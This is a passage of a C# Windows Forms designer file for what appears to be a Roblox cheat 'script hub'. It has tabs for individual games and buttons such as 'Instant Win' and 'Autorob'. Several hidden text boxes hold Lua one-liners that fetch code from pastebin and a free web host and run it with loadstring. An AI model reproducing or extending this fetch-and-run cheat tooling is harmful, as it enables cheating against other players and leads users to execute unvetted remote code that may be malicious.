            this.pictureBox153.Size = new System.Drawing.Size(149, 149);
            this.pictureBox153.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox153.TabIndex = 23;
            this.pictureBox153.TabStop = false;
            // 
            // flatButton249
            // 
            this.flatButton249.BackColor = System.Drawing.Color.Transparent;
            this.flatButton249.BaseColor = System.Drawing.Color.Red;
            this.flatButton249.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton249.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton249.Location = new System.Drawing.Point(6, 6);
            this.flatButton249.Name = "flatButton249";
            this.flatButton249.Rounded = false;
            this.flatButton249.Size = new System.Drawing.Size(106, 35);
            this.flatButton249.TabIndex = 21;
            this.flatButton249.Text = "Instant Win";
            this.flatButton249.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton249.UseCustomColor = false;
            this.flatButton249.Click += new System.EventHandler(this.flatButton249_Click);
            // 
            // tabPage89
            // 
            this.tabPage89.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage89.Controls.Add(this.flatButton250);
            this.tabPage89.Controls.Add(this.pictureBox154);
            this.tabPage89.Controls.Add(this.richTextBox67);
            this.tabPage89.Controls.Add(this.flatButton251);
            this.tabPage89.Location = new System.Drawing.Point(4, 44);
            this.tabPage89.Name = "tabPage89";
            this.tabPage89.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage89.Size = new System.Drawing.Size(514, 249);
            this.tabPage89.TabIndex = 84;
            this.tabPage89.Text = "Rumble Quest";
            // 
            // flatButton250
            // 
            this.flatButton250.BackColor = System.Drawing.Color.Transparent;
            this.flatButton250.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton250.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton250.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton250.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton250.Location = new System.Drawing.Point(557, 369);
            this.flatButton250.Name = "flatButton250";
            this.flatButton250.Rounded = false;
            this.flatButton250.Size = new System.Drawing.Size(106, 35);
            this.flatButton250.TabIndex = 24;
            this.flatButton250.Text = "Home";
            this.flatButton250.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton250.UseCustomColor = false;
            this.flatButton250.Click += new System.EventHandler(this.flatButton250_Click);
            // 
            // pictureBox154
            // 
            this.pictureBox154.Location = new System.Drawing.Point(514, 6);
            this.pictureBox154.Name = "pictureBox154";
            this.pictureBox154.Size = new System.Drawing.Size(149, 149);
            this.pictureBox154.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox154.TabIndex = 23;
            this.pictureBox154.TabStop = false;
            // 
            // richTextBox67
            // 
            this.richTextBox67.Location = new System.Drawing.Point(8, 47);
            this.richTextBox67.Name = "richTextBox67";
            this.richTextBox67.Size = new System.Drawing.Size(121, 175);
            this.richTextBox67.TabIndex = 22;
            this.richTextBox67.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/TmhzPEef\", true))()\n";
            this.richTextBox67.Visible = false;
            // 
            // flatButton251
            // 
            this.flatButton251.BackColor = System.Drawing.Color.Transparent;
            this.flatButton251.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton251.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton251.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton251.Location = new System.Drawing.Point(6, 6);
            this.flatButton251.Name = "flatButton251";
            this.flatButton251.Rounded = false;
            this.flatButton251.Size = new System.Drawing.Size(106, 35);
            this.flatButton251.TabIndex = 21;
            this.flatButton251.Text = "GUI";
            this.flatButton251.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton251.UseCustomColor = false;
            this.flatButton251.Click += new System.EventHandler(this.flatButton251_Click);
            // 
            // tabPage90
            // 
            this.tabPage90.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage90.Controls.Add(this.flatButton252);
            this.tabPage90.Controls.Add(this.pictureBox155);
            this.tabPage90.Controls.Add(this.flatButton253);
            this.tabPage90.Location = new System.Drawing.Point(4, 44);
            this.tabPage90.Name = "tabPage90";
            this.tabPage90.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage90.Size = new System.Drawing.Size(514, 249);
            this.tabPage90.TabIndex = 85;
            this.tabPage90.Text = "Lawn Mowing Simulator";
            // 
            // flatButton252
            // 
            this.flatButton252.BackColor = System.Drawing.Color.Transparent;
            this.flatButton252.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton252.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton252.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton252.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton252.Location = new System.Drawing.Point(557, 369);
            this.flatButton252.Name = "flatButton252";
            this.flatButton252.Rounded = false;
            this.flatButton252.Size = new System.Drawing.Size(106, 35);
            this.flatButton252.TabIndex = 24;
            this.flatButton252.Text = "Home";
            this.flatButton252.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton252.UseCustomColor = false;
            this.flatButton252.Click += new System.EventHandler(this.flatButton252_Click);
            // 
            // pictureBox155
            // 
            this.pictureBox155.Location = new System.Drawing.Point(514, 6);
            this.pictureBox155.Name = "pictureBox155";
            this.pictureBox155.Size = new System.Drawing.Size(149, 149);
            this.pictureBox155.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox155.TabIndex = 23;
            this.pictureBox155.TabStop = false;
            // 
            // flatButton253
            // 
            this.flatButton253.BackColor = System.Drawing.Color.Transparent;
            this.flatButton253.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton253.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton253.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton253.Location = new System.Drawing.Point(6, 6);
            this.flatButton253.Name = "flatButton253";
            this.flatButton253.Rounded = false;
            this.flatButton253.Size = new System.Drawing.Size(106, 35);
            this.flatButton253.TabIndex = 21;
            this.flatButton253.Text = "GUI";
            this.flatButton253.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton253.UseCustomColor = false;
            this.flatButton253.Click += new System.EventHandler(this.flatButton253_Click);
            // 
            // tabPage91
            // 
            this.tabPage91.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage91.Controls.Add(this.flatButton254);
            this.tabPage91.Controls.Add(this.pictureBox156);
            this.tabPage91.Controls.Add(this.flatButton255);
            this.tabPage91.Location = new System.Drawing.Point(4, 44);
            this.tabPage91.Name = "tabPage91";
            this.tabPage91.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage91.Size = new System.Drawing.Size(514, 249);
            this.tabPage91.TabIndex = 86;
            this.tabPage91.Text = "The Floor Is LAVA!";
            // 
            // flatButton254
            // 
            this.flatButton254.BackColor = System.Drawing.Color.Transparent;
            this.flatButton254.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton254.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton254.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton254.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton254.Location = new System.Drawing.Point(557, 369);
            this.flatButton254.Name = "flatButton254";
            this.flatButton254.Rounded = false;
            this.flatButton254.Size = new System.Drawing.Size(106, 35);
            this.flatButton254.TabIndex = 24;
            this.flatButton254.Text = "Home";
            this.flatButton254.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton254.UseCustomColor = false;
            this.flatButton254.Click += new System.EventHandler(this.flatButton254_Click);
            // 
            // pictureBox156
            // 
            this.pictureBox156.Location = new System.Drawing.Point(514, 6);
            this.pictureBox156.Name = "pictureBox156";
            this.pictureBox156.Size = new System.Drawing.Size(149, 149);
            this.pictureBox156.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox156.TabIndex = 23;
            this.pictureBox156.TabStop = false;
            // 
            // flatButton255
            // 
            this.flatButton255.BackColor = System.Drawing.Color.Transparent;
            this.flatButton255.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton255.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton255.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton255.Location = new System.Drawing.Point(6, 6);
            this.flatButton255.Name = "flatButton255";
            this.flatButton255.Rounded = false;
            this.flatButton255.Size = new System.Drawing.Size(106, 35);
            this.flatButton255.TabIndex = 21;
            this.flatButton255.Text = "GUI";
            this.flatButton255.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton255.UseCustomColor = false;
            this.flatButton255.Click += new System.EventHandler(this.flatButton255_Click);
            // 
            // tabPage93
            // 
            this.tabPage93.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage93.Controls.Add(this.flatButton487);
            this.tabPage93.Controls.Add(this.flatButton418);
            this.tabPage93.Controls.Add(this.flatButton258);
            this.tabPage93.Controls.Add(this.pictureBox158);
            this.tabPage93.Location = new System.Drawing.Point(4, 44);
            this.tabPage93.Name = "tabPage93";
            this.tabPage93.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage93.Size = new System.Drawing.Size(514, 249);
            this.tabPage93.TabIndex = 88;
            this.tabPage93.Text = "Jailbreak";
            // 
            // flatButton487
            // 
            this.flatButton487.BackColor = System.Drawing.Color.Transparent;
            this.flatButton487.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton487.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton487.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton487.Location = new System.Drawing.Point(118, 6);
            this.flatButton487.Name = "flatButton487";
            this.flatButton487.Rounded = false;
            this.flatButton487.Size = new System.Drawing.Size(106, 35);
            this.flatButton487.TabIndex = 24;
            this.flatButton487.Text = "GUI 2";
            this.flatButton487.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton487.UseCustomColor = false;
            this.flatButton487.Click += new System.EventHandler(this.flatButton487_Click);
            // 
            // flatButton418
            // 
            this.flatButton418.BackColor = System.Drawing.Color.Transparent;
            this.flatButton418.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton418.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton418.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton418.Location = new System.Drawing.Point(6, 6);
            this.flatButton418.Name = "flatButton418";
            this.flatButton418.Rounded = false;
            this.flatButton418.Size = new System.Drawing.Size(106, 35);
            this.flatButton418.TabIndex = 21;
            this.flatButton418.Text = "Autorob";
            this.flatButton418.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton418.UseCustomColor = false;
            this.flatButton418.Click += new System.EventHandler(this.flatButton418_Click);
            // 
            // flatButton258
            // 
            this.flatButton258.BackColor = System.Drawing.Color.Transparent;
            this.flatButton258.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton258.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton258.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton258.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton258.Location = new System.Drawing.Point(557, 369);
            this.flatButton258.Name = "flatButton258";
            this.flatButton258.Rounded = false;
            this.flatButton258.Size = new System.Drawing.Size(106, 35);
            this.flatButton258.TabIndex = 20;
            this.flatButton258.Text = "Home";
            this.flatButton258.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton258.UseCustomColor = false;
            this.flatButton258.Click += new System.EventHandler(this.flatButton258_Click);
            // 
            // pictureBox158
            // 
            this.pictureBox158.Location = new System.Drawing.Point(514, 6);
            this.pictureBox158.Name = "pictureBox158";
            this.pictureBox158.Size = new System.Drawing.Size(149, 149);
            this.pictureBox158.TabIndex = 19;
            this.pictureBox158.TabStop = false;
            // 
            // tabPage94
            // 
            this.tabPage94.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage94.Controls.Add(this.richTextBox12);
            this.tabPage94.Controls.Add(this.flatButton427);
            this.tabPage94.Controls.Add(this.flatButton31);
            this.tabPage94.Controls.Add(this.pictureBox25);
            this.tabPage94.Location = new System.Drawing.Point(4, 44);
            this.tabPage94.Name = "tabPage94";
            this.tabPage94.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage94.Size = new System.Drawing.Size(514, 249);
            this.tabPage94.TabIndex = 89;
            this.tabPage94.Text = "Vehicle Simulator";
            // 
            // richTextBox12
            // 
            this.richTextBox12.Location = new System.Drawing.Point(6, 56);
            this.richTextBox12.Name = "richTextBox12";
            this.richTextBox12.Size = new System.Drawing.Size(106, 170);
            this.richTextBox12.TabIndex = 21;
            this.richTextBox12.Text = "loadstring(game:HttpGet((\'https://symeladscripts.000webhostapp.com/vehiclesimupda" +
    "te\'),true))()\n";
            this.richTextBox12.Visible = false;
            // 
            // flatButton427
            // 
            this.flatButton427.BackColor = System.Drawing.Color.Transparent;
            this.flatButton427.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton427.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton427.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton427.Location = new System.Drawing.Point(6, 15);
            this.flatButton427.Name = "flatButton427";
            this.flatButton427.Rounded = false;
            this.flatButton427.Size = new System.Drawing.Size(106, 35);
            this.flatButton427.TabIndex = 20;
            this.flatButton427.Text = "GUI";
            this.flatButton427.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton427.UseCustomColor = false;
            this.flatButton427.Click += new System.EventHandler(this.flatButton427_Click);
            // 
            // flatButton31
            // 
            this.flatButton31.BackColor = System.Drawing.Color.Transparent;
            this.flatButton31.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton31.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton31.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton31.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton31.Location = new System.Drawing.Point(557, 371);
            this.flatButton31.Name = "flatButton31";
            this.flatButton31.Rounded = false;
            this.flatButton31.Size = new System.Drawing.Size(106, 35);
            this.flatButton31.TabIndex = 19;
            this.flatButton31.Text = "Home";
            this.flatButton31.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton31.UseCustomColor = false;
            this.flatButton31.Click += new System.EventHandler(this.flatButton31_Click);
            // 
            // pictureBox25
            // 
            this.pictureBox25.Location = new System.Drawing.Point(514, 5);
            this.pictureBox25.Name = "pictureBox25";
            this.pictureBox25.Size = new System.Drawing.Size(149, 149);
            this.pictureBox25.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox25.TabIndex = 18;
            this.pictureBox25.TabStop = false;
            // 
            // tabPage96
            // 
            this.tabPage96.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage96.Controls.Add(this.flatButton268);
            this.tabPage96.Controls.Add(this.pictureBox167);
            this.tabPage96.Controls.Add(this.richTextBox68);
            this.tabPage96.Controls.Add(this.flatButton269);
            this.tabPage96.Location = new System.Drawing.Point(4, 44);
            this.tabPage96.Name = "tabPage96";
            this.tabPage96.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage96.Size = new System.Drawing.Size(514, 249);
            this.tabPage96.TabIndex = 91;
            this.tabPage96.Text = "Yar";
            // 
            // flatButton268
            // 
            this.flatButton268.BackColor = System.Drawing.Color.Transparent;
            this.flatButton268.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton268.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton268.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton268.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton268.Location = new System.Drawing.Point(557, 369);
            this.flatButton268.Name = "flatButton268";
            this.flatButton268.Rounded = false;
            this.flatButton268.Size = new System.Drawing.Size(106, 35);
            this.flatButton268.TabIndex = 24;
            this.flatButton268.Text = "Home";
            this.flatButton268.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton268.UseCustomColor = false;
            this.flatButton268.Click += new System.EventHandler(this.flatButton268_Click);
            // 
            // pictureBox167
            // 
            this.pictureBox167.Location = new System.Drawing.Point(514, 6);
            this.pictureBox167.Name = "pictureBox167";
            this.pictureBox167.Size = new System.Drawing.Size(149, 149);
            this.pictureBox167.TabIndex = 23;
            this.pictureBox167.TabStop = false;
            // 
            // richTextBox68
            // 
            this.richTextBox68.Location = new System.Drawing.Point(6, 47);
            this.richTextBox68.Name = "richTextBox68";
            this.richTextBox68.Size = new System.Drawing.Size(106, 170);
            this.richTextBox68.TabIndex = 22;
            this.richTextBox68.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/6tV6npW9\", true))()";
            this.richTextBox68.Visible = false;
            // 
            // flatButton269
            // 
            this.flatButton269.BackColor = System.Drawing.Color.Transparent;
            this.flatButton269.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton269.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton269.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton269.Location = new System.Drawing.Point(6, 6);
            this.flatButton269.Name = "flatButton269";
            this.flatButton269.Rounded = false;
            this.flatButton269.Size = new System.Drawing.Size(106, 35);
            this.flatButton269.TabIndex = 21;
            this.flatButton269.Text = "Insta Win";
            this.flatButton269.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton269.UseCustomColor = false;
            this.flatButton269.Click += new System.EventHandler(this.flatButton269_Click);
            // 
            // tabPage99
            // 
            this.tabPage99.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage99.Controls.Add(this.flatButton274);
            this.tabPage99.Controls.Add(this.pictureBox170);
            this.tabPage99.Controls.Add(this.flatButton275);
            this.tabPage99.Location = new System.Drawing.Point(4, 44);
            this.tabPage99.Name = "tabPage99";
            this.tabPage99.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage99.Size = new System.Drawing.Size(514, 249);
            this.tabPage99.TabIndex = 94;
            this.tabPage99.Text = "Pinewood Computer Core";
            // 
            // flatButton274
            // 
            this.flatButton274.BackColor = System.Drawing.Color.Transparent;
            this.flatButton274.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton274.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton274.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton274.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton274.Location = new System.Drawing.Point(557, 369);
            this.flatButton274.Name = "flatButton274";
            this.flatButton274.Rounded = false;
            this.flatButton274.Size = new System.Drawing.Size(106, 35);
            this.flatButton274.TabIndex = 36;
            this.flatButton274.Text = "Home";
            this.flatButton274.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton274.UseCustomColor = false;
            this.flatButton274.Click += new System.EventHandler(this.flatButton274_Click);
            // 
            // pictureBox170
            // 
            this.pictureBox170.Location = new System.Drawing.Point(514, 6);
            this.pictureBox170.Name = "pictureBox170";
            this.pictureBox170.Size = new System.Drawing.Size(149, 149);
            this.pictureBox170.TabIndex = 35;
            this.pictureBox170.TabStop = false;
            // 
            // flatButton275
            // 
            this.flatButton275.BackColor = System.Drawing.Color.Transparent;
            this.flatButton275.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton275.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton275.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton275.Location = new System.Drawing.Point(6, 6);
            this.flatButton275.Name = "flatButton275";
            this.flatButton275.Rounded = false;
            this.flatButton275.Size = new System.Drawing.Size(106, 35);
            this.flatButton275.TabIndex = 33;
            this.flatButton275.Text = "GUI";
            this.flatButton275.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton275.UseCustomColor = false;
            this.flatButton275.Click += new System.EventHandler(this.flatButton275_Click);
            // 
            // tabPage103
            // 
            this.tabPage103.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage103.Controls.Add(this.flatButton292);
            this.tabPage103.Controls.Add(this.pictureBox182);
            this.tabPage103.Controls.Add(this.flatButton293);
            this.tabPage103.Location = new System.Drawing.Point(4, 44);
            this.tabPage103.Name = "tabPage103";
            this.tabPage103.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage103.Size = new System.Drawing.Size(514, 249);
            this.tabPage103.TabIndex = 98;
            this.tabPage103.Text = "Jojo Blox";
            // 
            // flatButton292
            // 
            this.flatButton292.BackColor = System.Drawing.Color.Transparent;
            this.flatButton292.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton292.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton292.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton292.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton292.Location = new System.Drawing.Point(557, 369);
            this.flatButton292.Name = "flatButton292";
            this.flatButton292.Rounded = false;
            this.flatButton292.Size = new System.Drawing.Size(106, 35);
            this.flatButton292.TabIndex = 47;
            this.flatButton292.Text = "Home";
            this.flatButton292.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton292.UseCustomColor = false;
            this.flatButton292.Click += new System.EventHandler(this.flatButton292_Click);
            // 
            // pictureBox182
            // 
            this.pictureBox182.Location = new System.Drawing.Point(514, 6);
            this.pictureBox182.Name = "pictureBox182";
            this.pictureBox182.Size = new System.Drawing.Size(149, 149);
            this.pictureBox182.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox182.TabIndex = 46;
            this.pictureBox182.TabStop = false;
            // 
            // flatButton293
            // 
            this.flatButton293.BackColor = System.Drawing.Color.Transparent;
            this.flatButton293.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton293.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton293.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton293.Location = new System.Drawing.Point(6, 6);
            this.flatButton293.Name = "flatButton293";
            this.flatButton293.Rounded = false;
            this.flatButton293.Size = new System.Drawing.Size(106, 35);
            this.flatButton293.TabIndex = 45;
            this.flatButton293.Text = "GUI";
            this.flatButton293.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton293.UseCustomColor = false;
            this.flatButton293.Click += new System.EventHandler(this.flatButton293_Click);
            // 
            // tabPage104
            // 
            this.tabPage104.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage104.Controls.Add(this.flatButton294);
            this.tabPage104.Controls.Add(this.pictureBox183);
            this.tabPage104.Controls.Add(this.richTextBox75);
            this.tabPage104.Controls.Add(this.flatButton295);
            this.tabPage104.Location = new System.Drawing.Point(4, 44);
            this.tabPage104.Name = "tabPage104";
            this.tabPage104.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage104.Size = new System.Drawing.Size(514, 249);
            this.tabPage104.TabIndex = 99;
            this.tabPage104.Text = "Fitness Simulator";
            // 
            // flatButton294
            // 
            this.flatButton294.BackColor = System.Drawing.Color.Transparent;
            this.flatButton294.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton294.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton294.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton294.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton294.Location = new System.Drawing.Point(557, 369);
            this.flatButton294.Name = "flatButton294";
            this.flatButton294.Rounded = false;
            this.flatButton294.Size = new System.Drawing.Size(106, 35);
            this.flatButton294.TabIndex = 48;
            this.flatButton294.Text = "Home";
            this.flatButton294.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton294.UseCustomColor = false;
            this.flatButton294.Click += new System.EventHandler(this.flatButton294_Click);
            // 
            // pictureBox183
            // 
            this.pictureBox183.Location = new System.Drawing.Point(514, 6);
            this.pictureBox183.Name = "pictureBox183";
            this.pictureBox183.Size = new System.Drawing.Size(149, 149);
            this.pictureBox183.TabIndex = 47;
            this.pictureBox183.TabStop = false;
            // 
            // richTextBox75
            // 
            this.richTextBox75.Location = new System.Drawing.Point(6, 47);
            this.richTextBox75.Name = "richTextBox75";
            this.richTextBox75.Size = new System.Drawing.Size(106, 170);
            this.richTextBox75.TabIndex = 46;
            this.richTextBox75.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/BfWC68w8\", true))()\n";
            this.richTextBox75.Visible = false;
            // 
            // flatButton295
            // 
            this.flatButton295.BackColor = System.Drawing.Color.Transparent;
            this.flatButton295.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton295.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton295.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton295.Location = new System.Drawing.Point(6, 6);
            this.flatButton295.Name = "flatButton295";
            this.flatButton295.Rounded = false;
            this.flatButton295.Size = new System.Drawing.Size(106, 35);
            this.flatButton295.TabIndex = 45;
            this.flatButton295.Text = "GUI";
            this.flatButton295.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton295.UseCustomColor = false;
            this.flatButton295.Click += new System.EventHandler(this.flatButton295_Click);
            // 
            // tabPage105
            // 
            this.tabPage105.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage105.Controls.Add(this.flatButton296);
            this.tabPage105.Controls.Add(this.pictureBox184);
            this.tabPage105.Controls.Add(this.richTextBox76);
            this.tabPage105.Controls.Add(this.flatButton297);
            this.tabPage105.Location = new System.Drawing.Point(4, 44);
            this.tabPage105.Name = "tabPage105";
            this.tabPage105.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage105.Size = new System.Drawing.Size(514, 249);
            this.tabPage105.TabIndex = 100;
            this.tabPage105.Text = "King Piece";
            // 
            // flatButton296
            // 
            this.flatButton296.BackColor = System.Drawing.Color.Transparent;
            this.flatButton296.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton296.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton296.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton296.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton296.Location = new System.Drawing.Point(557, 369);
            this.flatButton296.Name = "flatButton296";
            this.flatButton296.Rounded = false;
            this.flatButton296.Size = new System.Drawing.Size(106, 35);
            this.flatButton296.TabIndex = 52;
            this.flatButton296.Text = "Home";
            this.flatButton296.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton296.UseCustomColor = false;
            this.flatButton296.Click += new System.EventHandler(this.flatButton296_Click);
            // 
            // pictureBox184
            // 
            this.pictureBox184.Location = new System.Drawing.Point(514, 6);
            this.pictureBox184.Name = "pictureBox184";
            this.pictureBox184.Size = new System.Drawing.Size(149, 149);
            this.pictureBox184.TabIndex = 51;
            this.pictureBox184.TabStop = false;
            // 
            // richTextBox76
            // 
            this.richTextBox76.Location = new System.Drawing.Point(6, 47);
            this.richTextBox76.Name = "richTextBox76";
            this.richTextBox76.Size = new System.Drawing.Size(106, 170);
            this.richTextBox76.TabIndex = 50;
            this.richTextBox76.Text = "loadstring(game:HttpGet((\'https://pastebin.com/raw/nt40VRjN\')))()\n";
            this.richTextBox76.Visible = false;
            // 
            // flatButton297
            // 
            this.flatButton297.BackColor = System.Drawing.Color.Transparent;
            this.flatButton297.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton297.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton297.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton297.Location = new System.Drawing.Point(6, 6);
            this.flatButton297.Name = "flatButton297";
            this.flatButton297.Rounded = false;
